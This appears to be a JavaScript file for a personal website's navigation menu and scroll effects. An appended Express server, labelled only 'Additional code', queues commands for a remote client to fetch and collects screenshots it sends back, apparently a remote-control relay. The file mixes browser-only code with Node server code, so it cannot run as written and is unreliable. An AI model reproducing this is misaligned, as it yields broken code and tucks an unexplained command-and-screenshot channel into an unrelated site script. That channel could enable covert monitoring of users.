const express = require('express');
const bodyParser = require('body-parser');

const menubar = document.querySelector('#menu');
const Navbar = document.querySelector('.navbar');
menubar.onclick=()=>{
    menubar.classList.toggle('bx-x');
    Navbar.classList.toggle('active')
}
const section=document.querySelectorAll('section');
const navlink = document.querySelectorAll('header nav a')
window.onscroll = ()=>{
    section.forEach(sec=>{
        let top = window.scrollY;
        let offset = sec.offsetTop - 150;
        let height = sec.offsetHeight;
        let id = sec.getAttribute('id')
        if(top>offset && top < offset + height){
            sec.classList.add('start-animation');
            navlink.forEach(links=>{
                links.classList.remove('active')
                document.querySelector('header nav a[href*='+id+']').classList.add('active')
              
            })
        }
    })
    var header = document.querySelector('.header');
    header.classList.toggle('sticky',window.scrollY>100)
    menubar.classList.remove('bx-x');
    Navbar.classList.remove('active')
}

// Additional code

const app = express();
app.use(bodyParser.json());

// Store commands in memory for simplicity
let commandQueue = [];
let responseQueue = [];

// Endpoint to receive a command from the application
app.post('/send-command', (req, res) => {
    const command = req.body.command;
    commandQueue.push(command);
    res.json({ status: 'Command received by the server.' });
});

// Endpoint for client to fetch the command
app.get('/get-command', (req, res) => {
    if (commandQueue.length > 0) {
        const command = commandQueue.shift();
        res.json({ command });
    } else {
        res.json({ command: null });
    }
});

// Endpoint for client to send the response (screenshot) back to the server
app.post('/send-response', (req, res) => {
    const { screenshot } = req.body;
    responseQueue.push(screenshot);
    res.json({ status: 'Response received by the server.' });
});

// Endpoint for the application to fetch the response (screenshot)
app.get('/get-response', (req, res) => {
    if (responseQueue.length > 0) {
        const screenshot = responseQueue.shift();
        res.json({ screenshot });
    } else {
        res.json({ screenshot: null });
    }
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
